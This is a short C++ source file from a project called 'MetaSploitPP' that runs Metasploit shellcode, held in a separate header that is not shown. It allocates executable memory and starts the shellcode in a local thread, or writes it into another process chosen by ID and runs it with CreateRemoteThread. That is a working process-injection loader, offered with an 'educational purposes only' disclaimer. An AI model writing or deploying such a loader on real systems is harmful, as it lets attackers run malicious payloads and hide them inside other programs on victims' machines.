#include "MetaSploit.h"
#include "ShellCode.h"
#include <Windows.h>
#include <iostream>
/*
  * Copy Right(c) 2022
  * Author : BINM7MD
  * Name   : MetaSploitPP
  * Contact Me : github.com/BINM7MD
  * This program is distributed for educational purposes only.
  * Usage Local Process : MetaSploit.Run( );
  * Usage Remote Process : 
  * MetaSploit.Remote = TRUE;
    MetaSploit.Process_ID = xxxx;
    MetaSploit.Run( );
 */
void MetaSploit::Run( ) {
	if (Remote == NULL) {
		HANDLE AllocatedMemory = VirtualAlloc(
			NULL,
			sizeof buf,
			MEM_COMMIT,
			PAGE_EXECUTE_READWRITE
		);
		memcpy(AllocatedMemory, buf, sizeof buf);
		HANDLE A_Thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AllocatedMemory, NULL, NULL, NULL);
		WaitForSingleObject(A_Thread, -1);
	}
	else {
		HANDLE H_Proc = OpenProcess(PROCESS_ALL_ACCESS, NULL, Process_ID);
		HANDLE AllocatedMemory = VirtualAllocEx(
			H_Proc , 
			NULL,
			sizeof buf,
			MEM_COMMIT,
			PAGE_EXECUTE_READWRITE
		);
		WriteProcessMemory(H_Proc, AllocatedMemory, buf, sizeof buf, NULL);
		HANDLE A_Thread = CreateRemoteThread(H_Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)AllocatedMemory, NULL, NULL, NULL);
		WaitForSingleObject(A_Thread, -1);

	}

}